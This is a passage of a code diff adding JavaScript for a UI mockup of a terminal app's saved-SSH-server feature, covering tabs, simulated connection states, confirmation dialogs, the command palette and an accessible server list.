+function tabTitle(t) { const r = remoteOf(t)?.remote; return fullName(t.name, "Untitled tab") + (r ? " — " + STATE_NAMES[r.state].toLowerCase() + " — " + fullDest(r.dest) : ""); }
+function renderTabs() {
+  const hadFocus = tabbar.contains(document.activeElement) && document.activeElement.dataset.tab;
+  tabbar.textContent = "";
+  for (const t of S.tabs) {
+    const r = remoteOf(t)?.remote;
+    const b = h("button", { type: "button", role: "tab", class: "tab", "aria-selected": String(t.id === S.active), "data-tab": t.id, title: tabTitle(t), tabindex: t.id === S.active ? "0" : "-1",
+      on: { click: () => showTab(t.id), contextmenu: (e) => { e.preventDefault(); openMenu(t, e.clientX, e.clientY); },
+        keydown: (e) => { if (e.key === "ContextMenu" || (e.key === "F10" && e.shiftKey)) { e.preventDefault(); const rc = b.getBoundingClientRect(); openMenu(t, rc.left + 10, rc.bottom); }
+          else if (e.key === "ArrowRight" || e.key === "ArrowLeft") { const all = $$(".tab", tabbar), i = all.indexOf(b); (all[i + (e.key === "ArrowRight" ? 1 : -1)] || b).focus(); } } } },
+      t.agent && h("span", { class: "agent-dot", role: "img", "aria-label": "An agent here is waiting for you", title: "An agent here is waiting for you" }),
+      r ? srvIcon(r.state, STATE_NAMES[r.state]) : chevIcon(),
+      /* S1b: a hub's source mark goes here, between the icon and the name. Nothing is drawn in S1. */
+      h("span", { class: "nm" }, nameEl(t.name, "Untitled tab")));
+    tabbar.append(b);
+  }
+  tabbar.append(h("button", { type: "button", class: "plus", "aria-label": "New tab", title: "New tab", on: { click: () => { addLocalTab(); } } }, "+"));
+  if (hadFocus) tabbar.querySelector('[data-tab="' + hadFocus + '"]')?.focus();
+}
+function addLocalTab(name = "Terminal", cwd = "~") { const p = newPane({ cwd, lines: [{ text: "dev@mac " + cwd + " % " }] }); const t = { id: nid("t"), name, serverNamed: false, panes: [p], activePane: p.id }; S.tabs.push(t); showTab(t.id); return t; }
+
+/* ---------- connect, the three states, End, Reconnect ---------- */
+function preflight(srv) {
+  if (S.store === "unreadable") return { kind: "unreadable" };
+  const sh = $("#shell").value; if (sh !== "zsh" && sh !== "bash") return { kind: "shell", shell: sh === "?" ? null : sh };
+  if (!srv) return { kind: "gone" };
+  const f = badField(srv, S.servers); if (f) return { kind: "checks", field: f };
+  return null;
+}
+/* Connect, from the palette or the list. A refusal opens no tab: the list shows it (SV-2 AC5, AC7, AC10). */
+function connect(serverId) {
+  const srv = serverById(serverId), no = preflight(srv);
+  if (no) {
+    log("Connect refused before any start (" + no.kind + "): no tab opened, 0 processes started.");
+    if (LIST) { LIST.msg = refusalMsg(no, srv); LIST.page = "list"; drawList(); } else { closeAllLayers(false); openList_({ refusal: no, server: srv }); }
+    if (LIST && S.store !== "unreadable") (LIST.dlg.querySelector('[data-act="msg"]') || LIST.dlg.querySelector(".filter"))?.focus();
+    say(flat(LIST?.msg?.text || "The server list could not be read.")); return;
+  }
+  closeAllLayers(false);
+  const p = newPane({ cwd: null }); const t = { id: nid("t"), name: srv.name, serverNamed: true, panes: [p], activePane: p.id };
+  S.tabs.push(t); p.remote = { serverId: srv.id, dest: destOf(srv), state: "connecting", kind: null, status: null, note: null };
+  showTab(t.id); startClient(p, srv, true);
+}
+function clearTimers(p) { for (const x of p.timers) clearTimeout(x); p.timers = []; }
+function setState(p, patch, announce) { Object.assign(p.remote, patch); const t = tabOf(p); updatePane(p); if (t) renderTabs(); renderSide(); if (announce) say(announce); }
+function startClient(p, srv, fresh) {
+  clearTimers(p); p.refusal = null; p.confirming = false;
+  counts.connect++; counts.starts++;
+  log("Connect request #" + counts.connect + ": { server: " + srv.id + ", pane: " + p.id + " } and nothing else. Client start #" + counts.starts + ".");
+  const how = $("#rc").value, nm = { name: srv.name };
+  if (!fresh) p.lines.push({ text: "" });
+  p.remote = { serverId: srv.id, dest: destOf(srv), state: "connecting", kind: null, status: null, note: null };
+  setState(p, {}, [nm, ": starting ssh."]);
+  const at = (ms, fn) => p.timers.push(setTimeout(fn, ms));
+  const ended = (kind, status, lines, words) => { for (const l of lines) p.lines.push({ text: l }); p.lines.push({ text: "[Process exited]" }); setState(p, { state: "ended", kind, status }, [nm, ": ", words, " Reconnect is in the command palette."]); };
+  if (how === "spawn") return at(200, () => ended("spawn", 2, [], "could not start a terminal, system error 2."));
+  if (how === "quick") return at(FAST() ? 700 : 1400, () => { p.lines.push({ text: summary(p.remote.dest).split(":")[0] + "'s password: " }); setState(p, { state: "live" }, [nm, ": ssh is running."]); });
+  if (how === "another") return at(600, () => { p.lines.push({ text: "[0] 0:zsh*                                   \"mac\" 10:42 18-Nov" }); setState(p, { kind: "another" }, [nm, ": your shell has not handed over to ssh. Another program is running. End is in the command palette."]); });
+  if (how === "silent") return at(500, () => ended("before", 0, [], "ended before ssh was seen to start, exit status 0."));
+  if (how === "nossh") return at(500, () => ended("nossh", 127, ["zsh:1: command not found: ssh"], "no SSH client found, exit status 127."));
+  if (how === "waiting") p.lines.push({ text: "Load the work profile? [y/N] " });
+  if (how === "child") at(500, () => { p.lines.push({ text: summary(p.remote.dest).split(":")[0] + "'s password: " }); drawLines(p); });
+  drawLines(p);
+  at(BOUND(), () => setState(p, { kind: "notyet" }, [nm, ": your shell has not handed over to ssh yet. End is in the command palette."]));
+}
+function answerStartup(p = activePane()) { /* demo: the start-up file's question is answered; ssh is then confirmed */
+  if (!p?.remote || p.remote.state !== "connecting" || p.remote.kind === "another") return log("Nothing to answer in the active pane.");
+  clearTimers(p); p.lines.push({ text: "y" }, { text: summary(p.remote.dest).split(":")[0] + "'s password: " });
+  setState(p, { state: "live", kind: null }, [{ name: pname(p) }, ": ssh is running."]);
+  log("ssh confirmed after the question was answered: the pane is live; the message and End are gone.");
+}
+function endPane(p) {
+  clearTimers(p); p.lines.push({ text: "[Process exited]" });
+  log("End: 0 bytes written into the pane; every process of the pane ended (a job that ignores the hangup is killed after 2 s). No second question.");
+  setState(p, { state: "ended", kind: null, note: "byEnd" }, [{ name: pname(p) }, ": ended. Reconnect is in the command palette."]);
+}
+function sshExits(p = activePane(), status = 255) {
+  if (!p?.remote || p.remote.state !== "live") return log("The active pane has no running ssh.");
+  p.lines.push({ text: "Connection to " + p.remote.dest.host + " closed." }, { text: "[Process exited]" });
+  setState(p, { state: "ended", status }, [{ name: pname(p) }, ": ssh ended, exit status " + status + ". Reconnect is in the command palette."]);
+}
+function reconnect(p) {
+  const srv = serverById(p.remote.serverId); if (!srv) return;
+  if (!sameDest(destOf(srv), p.remote.dest)) { /* the second, separate question: nothing starts here */
+    if (!p.confirming) { p.confirming = true; log("Reconnect: the destination changed, so 0 connect requests until the second confirmation."); }
+    updatePane(p); paneDom(p).bar.querySelector('[data-act="cancel"]')?.focus(); return;
+  }
+  startChecked(p, srv);
+}
+function startChecked(p, srv) {
+  const no = preflight(srv);
+  if (no) { p.refusal = no; log("Reconnect refused before any start (" + no.kind + "): the pane stays ended."); updatePane(p); say([{ name: pname(p) }, ": Reconnect was refused. Nothing was started."]); return; }
+  const hadBarFocus = paneDom(p).bar.contains(document.activeElement);
+  startClient(p, srv, false); if (hadBarFocus) focusTerm(p);
+}
+
+/* ---------- closing ---------- */
+const asks = (p) => p.remote && p.remote.state !== "ended";
+function closePane(p = activePane()) {
+  const t = tabOf(p); if (!t) return;
+  const go = () => {
+    clearTimers(p);
+    if (p.remote && p.remote.state !== "ended") log("Close: 0 bytes written into the pane; every process of the pane ended.");
+    if (t.panes.length === 1) return dropTab(t);
+    t.panes.splice(t.panes.indexOf(p), 1); PANES.get(p.id)?.root.remove(); PANES.delete(p.id);
+    if (p.remote && t.serverNamed) { t.serverNamed = false; t.name = "Terminal"; log("The tab's remote pane was closed: in one update the tab is named “Terminal” and is a local tab again."); say("The tab is now a local tab named Terminal."); }
+    t.activePane = t.panes[0].id; showTab(t.id);
+  };
+  if (!asks(p)) return go();
+  const r = p.remote, live = r.state === "live", who = "“" + cleanName(pname(p), "Unnamed server") + "” (" + fullDest(r.dest) + ")";
+  confirmDlg({ title: "Close this pane and end its connection?",
+    message: live ? "ssh is running in this pane for " + who + ". Closing the pane ends it, and anything running over that connection may be cut off. Better Terminal types nothing into it."
+      : "A connection to " + who + " is starting in this pane. Closing the pane ends whatever your shell's start-up files are running in it. Better Terminal types nothing into it.",
+    confirm: "Close and end connection", onConfirm: go });
+}
+function dropTab(t) {
+  if (S.tabs.length === 1) addLocalTab();
+  const rp = remoteOf(t);
+  if (isServerTab(t)) S.closed.push({ name: t.name, serverNamed: t.serverNamed, remote: rp && { serverId: rp.remote.serverId, dest: rp.remote.dest } });
+  else S.closed.push({ name: t.name });
+  for (const p of t.panes) { clearTimers(p); PANES.get(p.id)?.root.remove(); PANES.delete(p.id); }
+  S.tabs.splice(S.tabs.indexOf(t), 1); showTab(S.tabs[S.tabs.length - 1].id);
+}
+function closeTab(t = activeTab()) {
+  const p = t.panes.find(asks);
+  if (!p) { if (remoteOf(t)) log("Closing an ended server tab asks nothing."); return dropTab(t); }
+  const r = p.remote, others = t.panes.length - 1, more = others ? " The tab's " + (others === 1 ? "local pane closes" : others + " local panes close") + " too." : "";
+  confirmDlg({ title: "Close “" + cleanName(t.name, "Untitled tab") + "” and end its connection?",
+    message: (r.state === "live" ? "ssh is running in this tab for " + fullDest(r.dest) + ". Closing the tab ends it, and anything running over that connection may be cut off."
+      : "A connection to " + fullDest(r.dest) + " is starting in this tab. Closing the tab ends whatever your shell's start-up files are running in it.") + " Better Terminal types nothing into it." + more,
+    confirm: "Close and end connection", onConfirm: () => { log("Close of the tab: 0 bytes written into the remote pane; every process of the pane ended."); dropTab(t); } });
+}
+function reopenClosed() {
+  const c = S.closed.pop(); if (!c) return log("No closed tab to reopen.");
+  if (!c.remote) return addLocalTab(c.name);
+  const p = newPane({ cwd: null }); p.remote = { serverId: c.remote.serverId, dest: c.remote.dest, state: "ended", kind: null, status: null, note: "reopened" };
+  const t = { id: nid("t"), name: c.name, serverNamed: c.serverNamed, panes: [p], activePane: p.id }; S.tabs.push(t); showTab(t.id);
+  log("Reopen Closed Tab: an ended server tab; 0 connect requests, 0 terminals started.");
+}
+function quitRestart() {
+  let n = 0; for (const t of S.tabs) for (const p of t.panes) if (p.remote) { if (p.remote.state !== "ended") n++; clearTimers(p); p.confirming = false; p.refusal = null; Object.assign(p.remote, { state: "ended", kind: null, status: null, note: "restored" }); }
+  closeAllLayers(false); log("Quit: asked nothing; " + n + " live or starting connection" + (n === 1 ? "" : "s") + " ended, nothing typed into them. Restart: every server tab is back ended; 0 connect requests.");
+  showTab(S.active);
+}
+function split() {
+  const t = activeTab(), p = newPane({ cwd: "~", lines: [{ text: "dev@mac ~ % cat " , path: "src/main.rs:12" }, { text: "dev@mac ~ % " }] });
+  t.panes.push(p); t.activePane = p.id; log("Split: a local shell in your home folder (one create_pty request, 0 connect requests)."); showTab(t.id);
+}
+
+/* ---------- layers: one stack; Esc closes the top one only; Tab stays inside it; focus returns ---------- */
+const TABBABLE = 'a[href], button:not([disabled]), input:not([disabled]), select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])';
+function openLayer(el, o = {}) {
+  const L = { el, onEsc: o.onEsc, returnTo: o.returnTo || document.activeElement, trap: o.trap || el };
+  LAYERS.push(L); (o.host || layerEl).append(el); (o.initial?.() || el.querySelector(TABBABLE) || el).focus(); return L;
+}
+function closeLayer(L, focusTo) {
+  const i = LAYERS.indexOf(L); if (i < 0) return; LAYERS.splice(i, 1); L.el.remove();
+  if (focusTo === false) return;
+  const to = focusTo || L.returnTo;
+  if (to && to.isConnected && to.offsetParent !== null && !to.disabled) to.focus(); else if (LAYERS.length) (LAYERS[LAYERS.length - 1].trap.querySelector(TABBABLE))?.focus(); else focusTerm();
+}
+function closeAllLayers(focus = true) { while (LAYERS.length) closeLayer(LAYERS[LAYERS.length - 1], false); LIST = null; $("#tries").hidden = true; if (focus) focusTerm(); }
+document.addEventListener("keydown", (e) => {
+  const L = LAYERS[LAYERS.length - 1];
+  if (L) {
+    if (e.key === "Escape") { e.preventDefault(); e.stopPropagation(); (L.onEsc || (() => closeLayer(L)))(); return; }
+    if (e.key === "Tab") {
+      const stops = $$(TABBABLE, L.trap).filter((n) => n.offsetParent !== null && n.getAttribute("tabindex") !== "-1"), first = stops[0] || L.trap, last = stops[stops.length - 1] || L.trap, a = document.activeElement;
+      if (!L.trap.contains(a) || stops.length === 0 || (e.shiftKey ? a === first : a === last)) { e.preventDefault(); (e.shiftKey ? last : first).focus(); }
+    }
+    return;
+  }
+  /* today's window-level Escape (useKeybindings.ts): the scratchpad closes and the terminal takes focus. The bar has no key handler of its own. */
+  if (e.key === "Escape" && !e.metaKey && !e.ctrlKey && !e.shiftKey && !e.altKey) { scratchEl.hidden = true; focusTerm(); return; }
+  const mod = (e.metaKey || e.ctrlKey) && !e.altKey;
+  if (mod && e.key.toLowerCase() === "p") { e.preventDefault(); openPalette(); }
+  else if (mod && e.key.toLowerCase() === "k") { e.preventDefault(); openSwitcher(); }
+}, true);
+
+/* ---------- ConfirmDialog, as today: plain strings, Cancel has focus, Enter confirms, Esc cancels. F7 gives it words; what it needs to carry them is in the spec (6.1, question A7). ---------- */
+function confirmDlg({ title, message, confirm, onConfirm, onCancel }) {
+  const tid = nid("ct"), mid = nid("cm"); let L;
+  const done = (yes) => { closeLayer(L, yes || onCancel ? false : undefined); if (yes) onConfirm(); else onCancel?.(); };
+  const cancel = h("button", { type: "button", class: "cbtn cbtn--cancel", "data-act": "cancel", on: { click: () => done(false) } }, "Cancel");
+  const ok = h("button", { type: "button", class: "cbtn cbtn--ok", "data-act": "confirm", on: { click: () => done(true) } }, confirm);
+  const dlg = h("div", { class: "cdlg", role: "alertdialog", "aria-modal": "true", "aria-labelledby": tid, "aria-describedby": mid, on: { keydown: (e) => { if (e.key === "Enter") { e.preventDefault(); done(true); } } } },
+    h("div", { class: "h" }, warnIcon(""), h("span", { id: tid }, title)), h("p", { id: mid }, message), h("div", { class: "btns" }, cancel, ok));
+  L = openLayer(h("div", { class: "cscrim", on: { mousedown: (e) => { if (e.target === e.currentTarget) done(false); } } }, dlg), { initial: () => cancel, onEsc: () => done(false) });
+}
+function toast(title, body) { toastsEl.textContent = ""; const t = h("div", { class: "toast", role: "status" }, h("div", { class: "t" }, title), h("div", { class: "b" }, body)); toastsEl.append(t); setTimeout(() => t.remove(), 8000); }
+
+/* ---------- the tab's menu ---------- */
+function openMenu(t, x, y) {
+  const wr = win.getBoundingClientRect(), server = isServerTab(t); let L;
+  const item = (label, run, o = {}) => h("button", { type: "button", role: "menuitem", class: o.sep ? "sep" : "", disabled: o.disabled, on: { click: () => { closeLayer(L); run(); } } }, label);
+  const menu = h("div", { class: "menu", role: "menu", "aria-label": "Tab", style: "left:" + Math.min(x - wr.left, wr.width - 250) + "px;top:" + (y - wr.top) + "px" },
+    item("Rename", () => log("Rename: the tab bar's box opens. A commit with the text unchanged is not a rename and keeps the tab a server tab (SV-3 AC1).")),
+    !server && item("Duplicate", () => addLocalTab(t.name === "Terminal" ? t.name : t.name + " (copy)")),
+    item("New Sub-terminal", () => log("New Sub-terminal: a local shell in your home folder, as today.")),
+    !server && item("Move to New Window", () => log("Move to New Window (a local tab, as today).")),
+    item("Sort Tabs by Project", () => {}, { sep: true }),
+    item("Reopen Closed Tab", reopenClosed, { disabled: S.closed.length === 0 }),
+    item("Close Others", () => {}, { sep: true, disabled: S.tabs.length < 2 }),
+    item("Close", () => closeTab(t), { disabled: S.tabs.length < 2 }),
+    server && h("div", { class: "note", role: "note" }, "A server tab can't be copied or moved to its own window."));
+  menu.addEventListener("keydown", (e) => { const items = $$("button:not([disabled])", menu), i = items.indexOf(document.activeElement);
+    if (e.key === "ArrowDown") { e.preventDefault(); items[(i + 1) % items.length].focus(); } else if (e.key === "ArrowUp") { e.preventDefault(); items[(i - 1 + items.length) % items.length].focus(); } });
+  const wrap = h("div", null, h("div", { class: "menu-catch", on: { mousedown: () => closeLayer(L) } }), menu);
+  L = openLayer(wrap, { trap: menu });
+}
+
+/* ---------- the palette (CommandPalette.tsx): today's entries, then F7's ---------- */
+const CAT = { Tabs: "#58a6ff", Panes: "#3fb950", Panels: "#bc8cff", Themes: "#d29922", Recording: "#ff7b72", BMAD: "#2dd4bf", Contracts: "#f0883e", Servers: "#56d4dd" };
+function paletteItems() {
+  const note = (what) => () => log("Palette: " + what + " (an existing command; not part of this mockup).");
+  const it = [
+    ["Tabs", "New Tab", "⌘T", () => addLocalTab()], ["Tabs", "Close Tab", "⌘W", () => closeTab()], ["Tabs", "Rename Tab", "⌘R", note("Rename Tab")],
+    ["Panes", "Split Horizontally", "⌘D", split], ["Panes", "Close Pane", "⌘⇧W", () => closePane()],
+    ["Panels", "Toggle Scratchpad", "⌘J", () => toggleScratch()], ["Panels", "Toggle File Browser", "⌘B", () => toggleFb()],
+    ["Tabs", "Tabs: Go to tab", "⌘K", openSwitcher], ["Tabs", "Tabs: Reopen closed tab", "⌘⇧T", reopenClosed],
+    ["Integrations", "MCP: Library of servers for Claude Code", "⌘⇧I", note("MCP library")], ["Integrations", "Secrets: Vault (system keychain)", null, note("Secrets")], ["Tokens", "Tokens: Usage, cost and ways to save", "⌘⇧G", note("Tokens")],
+    ["Panels", "Open Settings", "⌘,", note("Settings")], ["Themes", "Theme: Precision", null, () => setTheme(0)], ["Themes", "Theme: Nord", null, () => setTheme(4)],
+  ].map(([category, label, shortcut, run]) => ({ category, label, shortcut, run }));
+  S.tabs.forEach((t, i) => it.push({ category: "Tabs", label: "Switch to: " + fullName(t.name, "Untitled tab"), shortcut: i < 9 ? "⌘" + (i + 1) : null, run: () => showTab(t.id) }));
+  /* F7's entries follow every entry the palette had (SV-9 AC2). */
+  const p = activePane(), r = p?.remote;
+  if (r && r.state === "ended" && serverById(r.serverId)) it.push({ category: "Servers", label: "Servers: Reconnect this pane", run: () => reconnect(p), f7: true });
+  if (r && r.state === "connecting" && r.kind) it.push({ category: "Servers", label: "Servers: End what is running in this pane", run: () => endPane(p), f7: true });
+  if (S.available) {
+    it.push({ category: "Servers", label: "Servers: Open saved servers", run: () => openList_(), f7: true, keep: true });
+    if (S.store !== "unreadable") for (const s of S.servers.slice().sort(byName)) it.push({ category: "Servers", label: "Connect to " + fullName(s.name, "Unnamed server") + " (" + fullDest(destOf(s)) + ")", server: s, run: () => connect(s.id), f7: true, keep: true });
+  }
+  return it;
+}
+function openPalette(preset = "") {
+  if (LAYERS.length) return;
+  let items = paletteItems(), shown = items, sel = 0, L;
+  const list = h("div", { class: "pal__list", role: "listbox", id: "pal-list", "aria-label": "Commands" });
+  const input = h("input", { type: "text", placeholder: "Type a command...", "aria-label": "Command", role: "combobox", "aria-expanded": "true", "aria-controls": "pal-list", autocomplete: "off", spellcheck: "false" });
+  const draw = () => {
+    list.textContent = "";
+    if (!shown.length) list.append(h("div", { class: "pal__none" }, "No matching commands"));
+    shown.forEach((x, i) => {
+      const col = CAT[x.category];
+      const lab = x.server ? h("span", { class: "pal__lab" }, h("span", null, "Connect to ", nameEl(x.server.name)), destEl(destOf(x.server))) : h("span", { class: "pal__lab" }, x.label);
+      const row = h("div", { class: "pal__item", role: "option", id: "pal-" + i, "aria-selected": String(i === sel), "aria-label": x.label, on: { mouseenter: () => { sel = i; mark(); }, click: () => run(i) } },
+        h("div", { class: "l" }, h("span", { class: "pal__cat", style: col ? "color:" + col + ";background:" + col + "20" : "color:var(--text-muted)" }, x.category), lab), x.shortcut && h("kbd", null, x.shortcut));
+      list.append(row);
+    });
+    mark();
+  };
+  const mark = () => { $$(".pal__item", list).forEach((n, i) => n.setAttribute("aria-selected", String(i === sel))); const cur = list.children[sel]; if (cur?.id) { input.setAttribute("aria-activedescendant", cur.id); cur.scrollIntoView({ block: "nearest" }); } else input.removeAttribute("aria-activedescendant"); };
+  const filter = () => { const q = input.value.toLowerCase(); shown = !q ? items : items.filter((x) => x.label.toLowerCase().includes(q) || x.category.toLowerCase().includes(q) || (x.shortcut || "").toLowerCase().includes(q)); sel = 0; draw(); };
+  const run = (i) => { const x = shown[i]; if (!x) return; closeLayer(L, false); x.run(); if (!LAYERS.length && !paneDom(activePane()).bar.contains(document.activeElement)) focusTerm(); };
+  input.addEventListener("input", filter);
+  input.addEventListener("keydown", (e) => { if (e.key === "ArrowDown") { e.preventDefault(); sel = Math.min(sel + 1, shown.length - 1); mark(); } else if (e.key === "ArrowUp") { e.preventDefault(); sel = Math.max(sel - 1, 0); mark(); } else if (e.key === "Enter") { e.preventDefault(); run(sel); } });
+  const pal = h("div", { class: "pal", role: "dialog", "aria-modal": "true", "aria-label": "Command palette" }, h("div", { class: "pal__in" }, input), list, h("div", { class: "pal__foot" }, h("span", null, "↑↓ navigate"), h("span", null, "↵ select"), h("span", null, "esc close")));
+  L = openLayer(h("div", { class: "scrim palz", on: { mousedown: (e) => { if (e.target === e.currentTarget) closeLayer(L); } } }, pal), { initial: () => input });
+  input.value = preset; filter();
+}
+
+/* ---------- the tab switcher (TabSwitcher.tsx) ---------- */
+function openSwitcher() {
+  if (LAYERS.length) return; let sel = 0, L;
+  const ul = h("ul", { role: "listbox", "aria-label": "Open tabs", id: "sw-list" });
+  const input = h("input", { type: "text", placeholder: "Go to tab: name, folder or project", "aria-label": "Search tabs", role: "combobox", "aria-expanded": "true", "aria-controls": "sw-list" });
+  let shown = [];
+  const draw = () => {
+    const q = input.value.toLowerCase(); shown = S.tabs.filter((t) => cleanText(t.name).toLowerCase().includes(q) || (!remoteOf(t) && (t.panes[0].cwd || "").includes(q)));
+    ul.textContent = "";
+    shown.forEach((t, i) => { const r = remoteOf(t)?.remote;
+      ul.append(h("li", { role: "option", id: "sw-" + i, "aria-selected": String(i === sel), on: { click: () => go(i), mouseenter: () => { sel = i; draw(); } } },
+        h("span", { class: "num" }, String(S.tabs.indexOf(t) + 1)), r ? srvIcon(r.state) : chevIcon(), h("span", { class: "name" }, nameEl(t.name, "Untitled tab")),
+        r ? [h("span", { class: "st" }, "server · " + STATE_WORDS[r.state]), destEl(r.dest)] : h("span", { class: "path" }, t.panes[0].cwd || "~"))); });
+    if (!shown.length) ul.append(h("li", null, "No tab matches."));
+    if (shown.length) input.setAttribute("aria-activedescendant", "sw-" + sel);
+  };
+  const go = (i) => { const t = shown[i]; if (!t) return; closeLayer(L, false); showTab(t.id); };
+  input.addEventListener("input", () => { sel = 0; draw(); });
+  input.addEventListener("keydown", (e) => { if (e.key === "ArrowDown") { e.preventDefault(); sel = Math.min(sel + 1, shown.length - 1); draw(); } else if (e.key === "ArrowUp") { e.preventDefault(); sel = Math.max(sel - 1, 0); draw(); } else if (e.key === "Enter") { e.preventDefault(); go(sel); } });
+  L = openLayer(h("div", { class: "scrim", on: { mousedown: (e) => { if (e.target === e.currentTarget) closeLayer(L); } } }, h("div", { class: "sw", role: "dialog", "aria-modal": "true", "aria-label": "Go to tab" }, input, ul)), { initial: () => input });
+  draw();
+}
+
+/* ---------- the server list (spec 4) ---------- */
+function openList_(o = {}) {
+  if (!S.available) return log("Saved servers are not available here (Windows, or an engagement's instance): there is no list and no palette entry.");
+  if (LIST) { LIST.msg = o.refusal ? refusalMsg(o.refusal, o.server) : LIST.msg; LIST.page = "list"; drawList(); return; }
+  const dlg = h("div", { class: "srv", tabindex: "-1", role: "dialog", "aria-modal": "true", "aria-labelledby": "srv-title" });
+  LIST = { dlg, page: "list", msg: o.refusal ? refusalMsg(o.refusal, o.server) : null, filter: "", row: 0, col: 0, edit: null, errors: {}, values: null, saveFail: false };
+  LIST.layer = openLayer(h("div", { class: "scrim", on: { mousedown: (e) => { if (e.target === e.currentTarget && LIST.page === "list") closeList(); } } }, dlg), { onEsc: () => (LIST.page === "form" ? leaveForm() : closeList()), initial: () => dlg });
+  drawList(); focusListStart();
+}
+function closeList() { const L = LIST.layer; LIST = null; $("#tries").hidden = true; closeLayer(L); }
+function refusalMsg(f, srv) {
+  if (f.kind === "checks") return { tone: "bad", text: ["“", { name: srv.name }, "” can't connect: its " + f.field + " is not valid. Nothing was started. Edit it to fix it."], action: { label: "Edit", aria: "Edit " + cleanName(srv.name, "Unnamed server"), run: () => openForm(srv) } };
+  if (f.kind === "shell") return { tone: "warn", text: ["Saved servers need zsh or bash as your login shell. "].concat(f.shell ? ["Yours is ", { code: f.shell }, ". "] : ["Yours is neither. "], "Nothing was started. You can still add, edit and remove servers, and ssh typed in a terminal works as before.") };
+  if (f.kind === "gone") return { tone: "warn", text: "That saved server no longer exists. Nothing was started. The list below is current." };
+  if (f.kind === "engagement") return { tone: "warn", text: "Saved servers are not available in an engagement. Nothing was started." };
+  return null;
+}
+const listRows = () => S.servers.slice().sort(byName).filter((s) => { const q = LIST.filter.toLowerCase(); return !q || cleanText(s.name).toLowerCase().includes(q) || s.host.toLowerCase().includes(q) || (s.user || "").toLowerCase().includes(q); });
+function focusListStart() { const d = LIST.dlg; (d.querySelector('[data-act="msg"]') || d.querySelector(".filter") || d.querySelector('[data-first]') || d.querySelector(TABBABLE) || d).focus(); }
+function focusCell(r, c) {
+  const rows = $$(".grow", LIST.dlg); if (!rows.length) return;
+  r = Math.max(0, Math.min(r, rows.length - 1)); const btns = $$("button", rows[r]); c = Math.max(0, Math.min(c, btns.length - 1));
+  LIST.row = r; LIST.col = c; $$(".grow button", LIST.dlg).forEach((b) => b.setAttribute("tabindex", "-1")); btns[c].setAttribute("tabindex", "0"); btns[c].focus(); btns[c].scrollIntoView({ block: "nearest" });
+}
+function msgStrip(m, live = "status") {
+  return h("div", { class: "srv-msg", role: live, "data-tone": m.tone }, m.tone === "bad" ? stopIcon() : warnIcon(), h("div", { class: "txt" }, parts(m.text)),
+    m.action && h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--secondary", "aria-label": m.action.aria, "data-act": "msg", on: { click: m.action.run } }, m.action.label));
+}
+function drawList() {
+  const d = LIST.dlg; d.textContent = ""; $("#tries").hidden = true;
+  const n = S.servers.length, full = n >= 200, unread = S.store === "unreadable";
+  const close = h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--icon ui-btn--ghost", "aria-label": "Close saved servers", title: "Close (Esc)", on: { click: closeList } }, "✕");
+  const add = !unread && h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--primary", "data-act": "add", on: { click: () => (S.servers.length >= 200 ? fullMsg() : openForm(null)) } }, "Add server");
+  d.append(h("div", { class: "srv__header" }, h("h2", { id: "srv-title" }, "Saved servers"), h("span", { class: "srv__count" }, unread ? "" : n + " of 200"), add, close));
+  const body = h("div", { class: "srv__body" }); d.append(body);
+  if (unread) {
+    body.append(h("div", { class: "empty", role: "alert" }, stopIcon("big"), h("h3", null, "The server list could not be read"),
+      h("p", null, "Better Terminal found the file that holds your saved servers, but it is damaged or was written by a newer version. It has not been changed and will not be."),
+      h("p", null, "Until it can be read, Connect, Reconnect, Add, Edit and Remove are off. Update Better Terminal, or put back a copy of the file that worked. ssh typed in a terminal works as before."),
+      h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--secondary", "data-first": true, on: { click: () => { log("Read again: the file is read once more; nothing is written."); say("The server list still could not be read."); } } }, "Read again")));
+    return foot(d);
+  }
+  if (LIST.msg) body.append(msgStrip(LIST.msg, "alert"));
+  if (full && !LIST.msg) body.append(msgStrip({ tone: "warn", text: "The list is full: it holds 200 servers, the most Better Terminal keeps. Remove one to add another." }));
+  if (n === 0) {
+    body.append(h("div", { class: "empty" }, srvIcon("plain"), h("h3", null, "No saved servers yet"),
+      h("p", null, "Save an SSH destination once, then open it in a tab from here or from the command palette."),
+      h("p", null, "Better Terminal runs your own ssh, so your keys, agent, ~/.ssh/config and known hosts work as they do in any terminal. It stores no password and no key, and it lists no hosts from anywhere else."),
+      h("button", { type: "button", class: "ui-btn ui-btn--md ui-btn--primary", "data-first": true, on: { click: () => openForm(null) } }, "Add server")));
+    body.querySelector(".srv-ico").classList.add("big");
+    return foot(d);
+  }
+  const filter = h("input", { class: "filter", type: "text", placeholder: "Filter by name, host or user", "aria-label": "Filter saved servers", value: LIST.filter, autocomplete: "off", spellcheck: "false" });
+  filter.addEventListener("input", () => { LIST.filter = filter.value; drawGrid(); });
+  filter.addEventListener("keydown", (e) => { if (e.key === "ArrowDown" || e.key === "Enter") { e.preventDefault(); focusCell(0, 0); } });
+  /* S1b: a second group ("From open hubs") goes under this one, each with a heading. With one group no heading is drawn. */
+  const grid = h("div", { class: "grid", role: "grid", "aria-label": "Saved servers", id: "srv-grid" });
+  body.append(filter, grid); drawGrid(); foot(d);
+}
+function drawGrid() {
+  const grid = $("#srv-grid", LIST.dlg), rows = listRows(); grid.textContent = ""; grid.setAttribute("aria-rowcount", String(rows.length));
+  if (!rows.length) { grid.append(h("div", { class: "empty", role: "status" }, h("p", null, "No saved server matches the filter."))); return; }
+  rows.forEach((s, r) => {
+    const bad = badField(s, S.servers), kw = keyWarnFor(s.key), nm = cleanName(s.name, "Unnamed server");
+    const btn = (label, c, run, cls = "ui-btn--secondary") => h("button", { type: "button", class: "ui-btn ui-btn--md " + cls, tabindex: r === 0 && c === 0 ? "0" : "-1", "aria-label": label + " " + nm, "aria-describedby": c === 0 ? "gd-" + s.id : null, "data-act": label.toLowerCase(), "data-server": s.id, on: { click: run, focus: () => { LIST.row = r; LIST.col = c; } } }, label);
+    const row = h("div", { class: "grow", role: "row", "aria-rowindex": String(r + 1), "data-server": s.id },
+      h("div", { class: "gmain", role: "gridcell" }, srvIcon("plain"), h("span", { class: "gname" }, nameEl(s.name)),
+        h("div", { class: "gsub", id: "gd-" + s.id }, destEl(destOf(s)), s.key && h("span", { class: "key", title: cleanText(s.key) }, "key " + cutMid(cleanText(s.key), 14, 30))),
